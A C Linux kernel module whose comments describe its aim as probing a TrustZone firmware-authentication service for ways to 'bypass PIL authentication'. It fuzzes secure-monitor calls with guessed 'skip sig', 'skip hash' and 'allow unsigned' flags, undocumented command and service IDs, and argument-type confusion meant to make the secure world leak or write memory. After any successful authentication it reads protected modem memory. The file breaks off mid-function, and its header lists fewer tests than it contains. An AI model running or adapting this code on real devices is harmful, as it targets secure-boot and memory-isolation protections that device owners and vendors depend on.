/*
 * scm_extargs.c - Explore extended SCM args (argcount >= 5) on TZ PAS commands
 *
 * When argcount >= 5, scm_call2's allocate_extra_arg_buffer() creates a DMA
 * shared memory buffer, copies args[3..] into it, and passes its phys addr
 * via x5 to TZ. This module explores whether TZ processes these extended
 * args in ways that could bypass PIL authentication.
 *
 * Parameters:
 *   test=0: Scan all PAS cmds with argcount=5 vs argcount=1-3 (compare behavior)
 *   test=1: Extended init_image - extra args as potential override flags
 *   test=2: Extended auth_and_reset with extra args
 *   test=3: Undocumented PAS cmds (0x03,0x04,0x10-0x1F) with extended args
 *   test=4: Cross-SVC extended args - non-PAS services
 *   test=5: Full auth cycle with extended args at each step
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/moduleparam.h>
#include <linux/mm.h>
#include <linux/io.h>

extern void __dma_flush_area(const void *start, size_t size);

MODULE_LICENSE("GPL");

static int test = 0;
static int pid_val = 9;    /* default: venus */
module_param(test, int, 0);
module_param(pid_val, int, 0);

/* ---- SCM interface ---- */
#define MAX_SCM_ARGS 10
#define MAX_SCM_RETS 3

struct scm_desc {
    u32 arginfo;
    u64 args[MAX_SCM_ARGS];
    u64 ret[MAX_SCM_RETS];
    u64 __pad[8];
};

#define SCM_VAL   0x0
#define SCM_RO    0x1
#define SCM_RW    0x2
#define SCM_BUFVAL 0x3

#define QCOM_SCM_FNID(s, c)   (((s) & 0xFF) << 8 | ((c) & 0xFF))
#define SCM_SIP_FNID(s, c)    (0x42000000UL | QCOM_SCM_FNID(s, c))

#define PAS_SVC  0x02

extern int scm_call2(u32 fn_id, struct scm_desc *desc);

/* Helper: make arginfo for N args, all SCM_VAL */
static u32 make_arginfo_val(int n)
{
    u32 info = n;
    /* all args typed SCM_VAL (0) → bits [31:4] = 0 */
    return info;
}

/* Helper: make arginfo for N args with specified types */
static u32 make_arginfo(int n, int t0, int t1, int t2, int t3, int t4)
{
    return n | (t0 << 4) | (t1 << 6) | (t2 << 8) | (t3 << 10) | (t4 << 12);
}

static void dump_desc(const char *label, struct scm_desc *d, int ret)
{
    pr_info("scm_extargs: %s ret=%d r0=0x%llx r1=0x%llx r2=0x%llx\n",
            label, ret, d->ret[0], d->ret[1], d->ret[2]);
    /* Check if DMA allocator wrote to __pad */
    if (d->__pad[0] || d->__pad[1] || d->__pad[2])
        pr_info("scm_extargs:   dma: handle=0x%llx virt=0x%llx size=0x%llx\n",
                d->__pad[0], d->__pad[1], d->__pad[2]);
}

/* ================================================================
 * TEST 0: Compare PAS cmd behavior with argcount=normal vs argcount=5+
 * If TZ processes extended args, return values or behavior may differ.
 * ================================================================ */
static void __init test_compare_argcount(void)
{
    struct scm_desc desc;
    int ret_norm, ret_ext;
    int cmd;
    /* PAS commands and their normal argcount */
    struct { int cmd; int normal_ac; const char *name; } pas_cmds[] = {
        {0x01, 2, "init_image"},
        {0x02, 3, "mem_setup"},
        {0x05, 1, "auth_reset"},
        {0x06, 1, "shutdown"},
        {0x07, 1, "is_supported"},
        {0x08, 1, "cmd_08"},
        {0x09, 1, "get_pil_range"},
        {0x0e, 1, "cmd_0e"},
        {0x0f, 1, "cmd_0f"},
    };
    int i;

    pr_info("scm_extargs: === TEST 0: Compare argcount normal vs extended (PID=%d) ===\n", pid_val);

    /* First, shutdown to clean state */
    memset(&desc, 0, sizeof(desc));
    desc.arginfo = make_arginfo_val(1);
    desc.args[0] = pid_val;
    scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
    msleep(50);

    for (i = 0; i < sizeof(pas_cmds)/sizeof(pas_cmds[0]); i++) {
        cmd = pas_cmds[i].cmd;

        /* --- Normal argcount --- */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(pas_cmds[i].normal_ac);
        desc.args[0] = pid_val;
        /* For init_image (cmd 1), need a phys addr in args[1] */
        if (cmd == 0x01) {
            void *p = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (p) {
                desc.args[1] = virt_to_phys(p);
                ret_norm = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
                free_pages((unsigned long)p, 0);
            } else {
                ret_norm = -ENOMEM;
            }
        } else if (cmd == 0x02) {
            desc.args[1] = 0x86a00000ULL; /* venus region */
            desc.args[2] = 0x500000ULL;
            ret_norm = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        } else {
            ret_norm = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        }
        pr_info("scm_extargs: [%s] normal(ac=%d) ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, pas_cmds[i].normal_ac, ret_norm,
                desc.ret[0], desc.ret[1]);

        msleep(50);

        /* --- Extended argcount=5, extra args set to various values --- */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(5);
        desc.args[0] = pid_val;
        if (cmd == 0x01) {
            void *p = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
            if (p) {
                desc.args[1] = virt_to_phys(p);
                desc.args[2] = 0;
                desc.args[3] = 1;  /* potential "skip auth" flag */
                desc.args[4] = 0;
                ret_ext = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
                free_pages((unsigned long)p, 0);
            } else {
                ret_ext = -ENOMEM;
            }
        } else if (cmd == 0x02) {
            desc.args[1] = 0x86a00000ULL;
            desc.args[2] = 0x500000ULL;
            desc.args[3] = 1;
            desc.args[4] = 0;
            ret_ext = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        } else {
            desc.args[1] = 0;
            desc.args[2] = 0;
            desc.args[3] = 1;
            desc.args[4] = 0;
            ret_ext = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        }
        pr_info("scm_extargs: [%s] extend(ac=5) ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret_ext, desc.ret[0], desc.ret[1]);

        /* Flag if behavior differs */
        if (ret_norm != ret_ext)
            pr_info("scm_extargs: *** BEHAVIOR CHANGE: %s normal=%d ext=%d ***\n",
                    pas_cmds[i].name, ret_norm, ret_ext);

        msleep(50);
    }
}

/* ================================================================
 * TEST 1: Extended init_image - args[3..] as potential flags
 * Try different flag values in extended args to see if TZ
 * interprets them as auth override, debug mode, etc.
 * ================================================================ */
static void __init test_ext_init_image(void)
{
    struct scm_desc desc;
    int ret;
    void *meta_buf;
    phys_addr_t meta_phys;
    int i;
    /* Flag values to try in args[3] */
    static const u64 flags[] = {
        0, 1, 2, 3, 4, 0xFF, 0x100, 0xFFFF,
        0x10000, 0x80000000ULL, 0xFFFFFFFFULL,
        0xDEAD0001ULL,  /* magic "debug" value */
        0x00000002ULL,  /* potential "skip sig" */
        0x00000004ULL,  /* potential "skip hash" */
        0x00000008ULL,  /* potential "allow unsigned" */
        0x00000010ULL,  /* potential "test mode" */
        0x00000020ULL,  /* potential "oem unlock" */
        0x53454355ULL,  /* "SECU" magic */
        0x44454247ULL,  /* "DEBG" magic */
    };

    pr_info("scm_extargs: === TEST 1: Extended init_image flags (PID=%d) ===\n", pid_val);

    meta_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
    if (!meta_buf) return;
    meta_phys = virt_to_phys(meta_buf);

    /* First get baseline with normal argcount */
    memset(&desc, 0, sizeof(desc));
    desc.arginfo = make_arginfo(2, SCM_VAL, SCM_RW, 0, 0, 0);
    desc.args[0] = pid_val;
    desc.args[1] = meta_phys;
    ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
    pr_info("scm_extargs: baseline init_image(ac=2) ret=%d r0=0x%llx\n", ret, desc.ret[0]);

    /* Try each flag value */
    for (i = 0; i < sizeof(flags)/sizeof(flags[0]); i++) {
        /* Shutdown first to clean state */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
        msleep(30);

        /* Extended init_image with flag */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo(5, SCM_VAL, SCM_RW, SCM_VAL, SCM_VAL, SCM_VAL);
        desc.args[0] = pid_val;
        desc.args[1] = meta_phys;
        desc.args[2] = 0;
        desc.args[3] = flags[i];
        desc.args[4] = 0;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
        pr_info("scm_extargs: init_image flag[%d]=0x%llx ret=%d r0=0x%llx\n",
                i, flags[i], ret, desc.ret[0]);

        if (ret == 0)
            pr_info("scm_extargs: *** INIT SUCCESS with flag=0x%llx! ***\n", flags[i]);

        msleep(30);
    }

    /* Also try argcount=6,7,8 with flag=1 */
    for (i = 5; i <= 8; i++) {
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
        msleep(30);

        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(i);
        desc.args[0] = pid_val;
        desc.args[1] = meta_phys;
        desc.args[2] = 0;
        desc.args[3] = 1;
        desc.args[4] = 1;
        desc.args[5] = 1;
        desc.args[6] = 1;
        desc.args[7] = 1;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
        pr_info("scm_extargs: init_image argcount=%d ret=%d r0=0x%llx\n",
                i, ret, desc.ret[0]);
        msleep(30);
    }

    free_pages((unsigned long)meta_buf, 0);
}

/* ================================================================
 * TEST 2: Extended auth_and_reset with extra args
 * After a normal init_image + mem_setup, try auth with extra args
 * that might disable hash verification or XPU locking
 * ================================================================ */
static void __init test_ext_auth(void)
{
    struct scm_desc desc;
    int ret;
    void *meta_buf;
    phys_addr_t meta_phys;
    int i;
    static const u64 auth_flags[] = {
        0, 1, 2, 3, 4, 0xFF,
        0x80000000ULL,   /* potential "skip hash check" */
        0xFFFFFFFFULL,   /* all flags */
        0x00000001ULL,   /* potential "skip xpu lock" */
        0x00000002ULL,   /* potential "debug auth" */
    };

    pr_info("scm_extargs: === TEST 2: Extended auth_and_reset (PID=%d) ===\n", pid_val);

    meta_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
    if (!meta_buf) return;
    meta_phys = virt_to_phys(meta_buf);

    for (i = 0; i < sizeof(auth_flags)/sizeof(auth_flags[0]); i++) {
        /* Clean cycle: shutdown → init → mem_setup → ext auth */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
        msleep(50);

        /* init_image (normal, will return -22 for zeros but TZ state changes) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo(2, SCM_VAL, SCM_RW, 0, 0, 0);
        desc.args[0] = pid_val;
        desc.args[1] = meta_phys;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);

        /* mem_setup */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo(3, SCM_VAL, SCM_VAL, SCM_VAL, 0, 0);
        desc.args[0] = pid_val;
        desc.args[1] = 0x86a00000ULL;
        desc.args[2] = 0x500000ULL;
        scm_call2(SCM_SIP_FNID(PAS_SVC, 0x02), &desc);

        /* Extended auth_and_reset */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(5);
        desc.args[0] = pid_val;
        desc.args[1] = auth_flags[i];
        desc.args[2] = auth_flags[i];
        desc.args[3] = auth_flags[i];
        desc.args[4] = auth_flags[i];
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x05), &desc);
        pr_info("scm_extargs: auth_reset flag=0x%llx ret=%d r0=0x%llx\n",
                auth_flags[i], ret, desc.ret[0]);

        if (ret == 0)
            pr_info("scm_extargs: *** AUTH SUCCESS with flag=0x%llx! ***\n",
                    auth_flags[i]);

        msleep(50);
    }

    /* Cleanup */
    memset(&desc, 0, sizeof(desc));
    desc.arginfo = make_arginfo_val(1);
    desc.args[0] = pid_val;
    scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);

    free_pages((unsigned long)meta_buf, 0);
}

/* ================================================================
 * TEST 3: Undocumented PAS commands with extended args
 * Some vendor-specific PAS commands may accept extended args for
 * features like debug unlock, test auth, etc.
 * ================================================================ */
static void __init test_undocumented_cmds(void)
{
    struct scm_desc desc;
    int ret;
    int cmd;
    int safe_cmds[] = {0x03, 0x04, 0x0a, 0x0b, 0x0c, 0x0d, 0x0f,
                       0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
                       0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f};
    int i;

    pr_info("scm_extargs: === TEST 3: Undocumented PAS cmds extended (PID=%d) ===\n", pid_val);

    for (i = 0; i < sizeof(safe_cmds)/sizeof(safe_cmds[0]); i++) {
        cmd = safe_cmds[i];

        /* Try with argcount=1 (normal) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);

        if (ret != -95) {  /* -95 = EOPNOTSUPP, skip unsupported */
            pr_info("scm_extargs: PAS cmd=0x%02x ac=1 ret=%d r0=0x%llx r1=0x%llx\n",
                    cmd, ret, desc.ret[0], desc.ret[1]);

            /* Now try with extended args */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = make_arginfo_val(5);
            desc.args[0] = pid_val;
            desc.args[1] = 0;
            desc.args[2] = 0;
            desc.args[3] = 1;  /* flag */
            desc.args[4] = 0;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
            pr_info("scm_extargs: PAS cmd=0x%02x ac=5 ret=%d r0=0x%llx r1=0x%llx%s\n",
                    cmd, ret, desc.ret[0], desc.ret[1],
                    (desc.__pad[0] || desc.__pad[1]) ? " DMA_USED" : "");
        }

        msleep(30);
    }
}

/* ================================================================
 * TEST 4: Non-PAS services with extended args
 * Some SCM services may have hidden functionality with extra args.
 * ================================================================ */
static void __init test_cross_svc(void)
{
    struct scm_desc desc;
    int ret;
    /* SVC/CMD pairs that returned interesting values in prior scanning */
    struct { int svc; int cmd; const char *name; } targets[] = {
        {0x06, 0x03, "tz_feature"},       /* returned r0=0x400000 */
        {0x04, 0x05, "svc4_cmd5"},        /* returned 0 */
        {0x03, 0x0f, "svc3_cmd0f"},       /* returned 0 */
        {0x0C, 0x03, "mem_protect_03"},   /* returned 0 */
        {0x06, 0x01, "tz_info_01"},       /* returned 0 */
        /* PIL-adjacent services */
        {0x02, 0x09, "pil_get_range"},    /* returned region addresses */
        {0x02, 0x0e, "pil_cmd_0e"},       /* returned region addresses */
    };
    int i;

    pr_info("scm_extargs: === TEST 4: Cross-SVC extended args ===\n");

    for (i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        /* Normal call */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = 0;
        ret = scm_call2(SCM_SIP_FNID(targets[i].svc, targets[i].cmd), &desc);
        pr_info("scm_extargs: [%s] ac=1 ret=%d r0=0x%llx r1=0x%llx\n",
                targets[i].name, ret, desc.ret[0], desc.ret[1]);

        /* Extended call with flag args */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(5);
        desc.args[0] = 0;
        desc.args[1] = 1;
        desc.args[2] = 0;
        desc.args[3] = 0xDEADBEEFULL; /* distinctive value */
        desc.args[4] = 0;
        ret = scm_call2(SCM_SIP_FNID(targets[i].svc, targets[i].cmd), &desc);
        pr_info("scm_extargs: [%s] ac=5 ret=%d r0=0x%llx r1=0x%llx%s\n",
                targets[i].name, ret, desc.ret[0], desc.ret[1],
                (desc.__pad[0] || desc.__pad[1]) ? " DMA_USED" : "");

        /* Different flag: arg0=pid_val (in case service keyed by PID) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(5);
        desc.args[0] = pid_val;
        desc.args[1] = 1;
        desc.args[2] = 0;
        desc.args[3] = 1;
        desc.args[4] = 0;
        ret = scm_call2(SCM_SIP_FNID(targets[i].svc, targets[i].cmd), &desc);
        pr_info("scm_extargs: [%s] ac=5,pid=%d ret=%d r0=0x%llx r1=0x%llx\n",
                targets[i].name, pid_val, ret, desc.ret[0], desc.ret[1]);

        msleep(30);
    }
}

/* ================================================================
 * TEST 5: Full auth cycle with extended args at each step
 * Use real venus.mdt metadata (from /tmp/fw_meta.bin) for a valid
 * init_image, then try extended args at mem_setup and auth_reset.
 * ================================================================ */
static void __init test_full_cycle_ext(void)
{
    struct scm_desc desc;
    int ret;
    void *meta_buf;
    phys_addr_t meta_phys;
    struct file *f;
    loff_t fsize, pos = 0;
    ssize_t nread;

    pr_info("scm_extargs: === TEST 5: Full cycle with extended args (PID=%d) ===\n", pid_val);

    /* Read real venus.mdt */
    f = filp_open("/tmp/fw_meta.bin", O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_err("scm_extargs: can't open /tmp/fw_meta.bin (push venus.mdt first)\n");
        return;
    }
    fsize = i_size_read(file_inode(f));
    if (fsize <= 0 || fsize > 64 * 1024) {
        pr_err("scm_extargs: bad file size %lld\n", fsize);
        filp_close(f, NULL);
        return;
    }

    /* Alloc DMA-friendly buffer */
    meta_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, get_order(fsize));
    if (!meta_buf) { filp_close(f, NULL); return; }
    nread = kernel_read(f, meta_buf, fsize, &pos);
    filp_close(f, NULL);
    if (nread != fsize) { free_pages((unsigned long)meta_buf, get_order(fsize)); return; }
    __dma_flush_area(meta_buf, PAGE_SIZE << get_order(fsize));
    meta_phys = virt_to_phys(meta_buf);
    pr_info("scm_extargs: loaded %lld bytes, phys=0x%llx\n", fsize, (u64)meta_phys);

    /* --- Step 1: shutdown --- */
    memset(&desc, 0, sizeof(desc));
    desc.arginfo = make_arginfo_val(1);
    desc.args[0] = pid_val;
    ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
    pr_info("scm_extargs: shutdown ret=%d\n", ret);
    msleep(100);

    /* --- Step 2: init_image with REAL metadata (should succeed) --- */
    memset(&desc, 0, sizeof(desc));
    desc.arginfo = make_arginfo(2, SCM_VAL, SCM_RW, 0, 0, 0);
    desc.args[0] = pid_val;
    desc.args[1] = meta_phys;
    ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
    pr_info("scm_extargs: init_image(real_mdt) ret=%d r0=0x%llx\n", ret, desc.ret[0]);

    if (ret != 0) {
        pr_info("scm_extargs: init_image failed, trying with extended args\n");

        /* Try extended init_image with flag=1 */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo(5, SCM_VAL, SCM_RW, SCM_VAL, SCM_VAL, SCM_VAL);
        desc.args[0] = pid_val;
        desc.args[1] = meta_phys;
        desc.args[2] = (u64)fsize;
        desc.args[3] = 1;
        desc.args[4] = 0;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
        pr_info("scm_extargs: init_image_ext ret=%d r0=0x%llx\n", ret, desc.ret[0]);
    }

    if (ret == 0) {
        pr_info("scm_extargs: init_image SUCCEEDED!\n");

        /* --- Step 3a: mem_setup with normal args first --- */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo(3, SCM_VAL, SCM_VAL, SCM_VAL, 0, 0);
        desc.args[0] = pid_val;
        desc.args[1] = 0x8b700000ULL; /* IPA FW region */
        desc.args[2] = 0x100000ULL;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x02), &desc);
        pr_info("scm_extargs: mem_setup(normal) ret=%d\n", ret);

        if (ret == 0) {
            /* --- Step 4a: try normal auth_and_reset first --- */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = make_arginfo_val(1);
            desc.args[0] = pid_val;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x05), &desc);
            pr_info("scm_extargs: auth_reset(normal) ret=%d r0=0x%llx\n",
                    ret, desc.ret[0]);
            if (ret == 0) {
                pr_info("scm_extargs: *** NORMAL AUTH SUCCESS ***\n");
            }
        }

        /* --- Step 3b: mem_setup with extended args --- */
        /* Try different extended arg combos */
        static const u64 setup_flags[] = {0, 1, 0x80000000ULL};
        int j;
        for (j = 0; j < 3; j++) {
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = make_arginfo(5, SCM_VAL, SCM_VAL, SCM_VAL, SCM_VAL, SCM_VAL);
            desc.args[0] = pid_val;
            desc.args[1] = 0x8b700000ULL; /* IPA FW region */
            desc.args[2] = 0x100000ULL;
            desc.args[3] = setup_flags[j];
            desc.args[4] = 0;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x02), &desc);
            pr_info("scm_extargs: mem_setup flag=0x%llx ret=%d\n",
                    setup_flags[j], ret);
            if (ret == 0) break;
        }

        /* --- Step 4: auth_and_reset with extended args --- */
        /* Try to bypass hash check via extended arg */
        static const u64 auth_flags[] = {0, 1, 2, 0xFF, 0x80000000ULL};
        for (j = 0; j < 5; j++) {
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = make_arginfo_val(5);
            desc.args[0] = pid_val;
            desc.args[1] = auth_flags[j];
            desc.args[2] = 0;
            desc.args[3] = auth_flags[j];
            desc.args[4] = 0;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x05), &desc);
            pr_info("scm_extargs: auth_reset_ext flag=0x%llx ret=%d r0=0x%llx\n",
                    auth_flags[j], ret, desc.ret[0]);

            if (ret == 0) {
                pr_info("scm_extargs: *** AUTH SUCCESS with flag=0x%llx! ***\n",
                        auth_flags[j]);

                /* Check if XPU was skipped - try MSA read */
                void __iomem *msa = ioremap_wc(0x8b500000ULL, 0x1000);
                if (msa) {
                    u32 v = readl(msa);
                    pr_info("scm_extargs: MSA+0 = 0x%08x after auth\n", v);
                    iounmap(msa);
                }
                break;
            }
        }

        /* Shutdown */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
    }

    free_pages((unsigned long)meta_buf, get_order(fsize));
}

/* ================================================================
 * TEST 6: arginfo type confusion
 * PAS commands expect SCM_VAL args, but what if we mark them as
 * SCM_RO/SCM_RW/SCM_BUFVAL? TZ might interpret the value as a
 * pointer and read/write from it - potential info leak or write.
 * ================================================================ */
static void __init test_type_confusion(void)
{
    struct scm_desc desc;
    int ret;
    int i;
    void *buf;
    phys_addr_t buf_phys;
    /* Types to try for arg[0] */
    static const struct { int type; const char *name; } types[] = {
        {SCM_VAL,    "VAL"},
        {SCM_RO,     "RO"},
        {SCM_RW,     "RW"},
        {SCM_BUFVAL, "BUFVAL"},
    };

    pr_info("scm_extargs: === TEST 6: Arginfo type confusion (PID=%d) ===\n", pid_val);

    buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 0);
    if (!buf) return;
    buf_phys = virt_to_phys(buf);
    memset(buf, 0xBB, PAGE_SIZE); /* fill with marker */

    /* Test PAS is_supported (cmd 0x07) with different arg types */
    for (i = 0; i < 4; i++) {
        memset(&desc, 0, sizeof(desc));
        /* 1 arg, but mark its type differently */
        desc.arginfo = 1 | (types[i].type << 4);
        desc.args[0] = pid_val;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x07), &desc);
        pr_info("scm_extargs: is_supported type=%s ret=%d r0=0x%llx\n",
                types[i].name, ret, desc.ret[0]);
    }

    /* Test PAS shutdown (cmd 0x06) with different arg types */
    for (i = 0; i < 4; i++) {
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = 1 | (types[i].type << 4);
        desc.args[0] = pid_val;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x06), &desc);
        pr_info("scm_extargs: shutdown type=%s ret=%d r0=0x%llx\n",
                types[i].name, ret, desc.ret[0]);
    }

    /* Test get_pil_range with arg0 as buffer pointer */
    for (i = 0; i < 4; i++) {
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = 1 | (types[i].type << 4);
        /* For buffer types, pass phys addr */
        desc.args[0] = (types[i].type >= SCM_RO) ? buf_phys : (u64)pid_val;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x09), &desc);
        pr_info("scm_extargs: get_pil_range type=%s ret=%d r0=0x%llx r1=0x%llx\n",
                types[i].name, ret, desc.ret[0], desc.ret[1]);
    }

    /* Test init_image (cmd 0x01) with 2 args, vary arg0 type */
    for (i = 0; i < 4; i++) {
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = 2 | (types[i].type << 4) | (SCM_RO << 6);
        desc.args[0] = pid_val;
        desc.args[1] = buf_phys;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x01), &desc);
        pr_info("scm_extargs: init_image arg0_type=%s ret=%d r0=0x%llx\n",
                types[i].name, ret, desc.ret[0]);
    }

    /* Check if buf was written to by TZ (info leak) */
    {
        u32 *p = (u32 *)buf;
        int written = 0;
        int j;
        for (j = 0; j < 16; j++) {
            if (p[j] != 0xBBBBBBBBU) {
                written = 1;
                pr_info("scm_extargs: *** BUF MODIFIED at +%d: 0x%08x ***\n",
                        j*4, p[j]);
            }
        }
        if (!written)
            pr_info("scm_extargs: buffer not modified by TZ\n");
    }

    free_pages((unsigned long)buf, 0);
}

/* ================================================================
 * TEST 7: argcount=4 boundary (register-only, no DMA)
 * args[0-3] go via registers x1-x4. No DMA allocation.
 * TZ might react differently vs argcount=5 (DMA).
 * ================================================================ */
static void __init test_ac4_boundary(void)
{
    struct scm_desc desc;
    int ret;
    int cmd;
    struct { int cmd; int normal_ac; const char *name; } pas_cmds[] = {
        {0x06, 1, "shutdown"},
        {0x07, 1, "is_supported"},
        {0x08, 1, "cmd_08"},
        {0x09, 1, "get_pil_range"},
        {0x0e, 1, "cmd_0e"},
        {0x05, 1, "auth_reset"},
    };
    int i;

    pr_info("scm_extargs: === TEST 7: argcount=4 boundary (PID=%d) ===\n", pid_val);

    for (i = 0; i < sizeof(pas_cmds)/sizeof(pas_cmds[0]); i++) {
        cmd = pas_cmds[i].cmd;

        /* ac=1 (baseline) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(1);
        desc.args[0] = pid_val;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        pr_info("scm_extargs: [%s] ac=1 ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret, desc.ret[0], desc.ret[1]);

        /* ac=2 */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(2);
        desc.args[0] = pid_val;
        desc.args[1] = 0;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        pr_info("scm_extargs: [%s] ac=2 ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret, desc.ret[0], desc.ret[1]);

        /* ac=3 */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(3);
        desc.args[0] = pid_val;
        desc.args[1] = 0;
        desc.args[2] = 0;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        pr_info("scm_extargs: [%s] ac=3 ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret, desc.ret[0], desc.ret[1]);

        /* ac=4 (max register) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(4);
        desc.args[0] = pid_val;
        desc.args[1] = 0;
        desc.args[2] = 0;
        desc.args[3] = 0;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        pr_info("scm_extargs: [%s] ac=4 ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret, desc.ret[0], desc.ret[1]);

        /* ac=4 with arg3=1 (potential flag) */
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = make_arginfo_val(4);
        desc.args[0] = pid_val;
        desc.args[1] = 0;
        desc.args[2] = 0;
        desc.args[3] = 1;
        ret = scm_call2(SCM_SIP_FNID(PAS_SVC, cmd), &desc);
        pr_info("scm_extargs: [%s] ac=4,flag=1 ret=%d r0=0x%llx r1=0x%llx\n",
                pas_cmds[i].name, ret, desc.ret[0], desc.ret[1]);

        msleep(30);
    }
}

/* ================================================================
 * TEST 8: Alternate SVC IDs for PAS commands
 * Some vendor TZ may have duplicate/debug PAS under different SVCs
 * ================================================================ */
static void __init test_alt_svc(void)
{
    struct scm_desc desc;
    int ret;
    int svc, cmd;
    /* Try known PAS commands under different SVC IDs */
    int svcs[] = {0x01, 0x03, 0x04, 0x05, 0x06, 0x0A, 0x0B, 0x0C, 0x0D,
                  0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15};
    int pas_cmds[] = {0x01, 0x02, 0x05, 0x06, 0x07, 0x09};
    int i, j;

    pr_info("scm_extargs: === TEST 8: Alternate SVC IDs for PAS cmds ===\n");

    for (i = 0; i < sizeof(svcs)/sizeof(svcs[0]); i++) {
        svc = svcs[i];
        if (svc == PAS_SVC) continue;  /* skip real PAS SVC */

        for (j = 0; j < sizeof(pas_cmds)/sizeof(pas_cmds[0]); j++) {
            cmd = pas_cmds[j];
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = make_arginfo_val(1);
            desc.args[0] = pid_val;
            ret = scm_call2(SCM_SIP_FNID(svc, cmd), &desc);

            if (ret != -22 && ret != -95) {
                pr_info("scm_extargs: *** SVC=0x%02x CMD=0x%02x ret=%d r0=0x%llx ***\n",
                        svc, cmd, ret, desc.ret[0]);
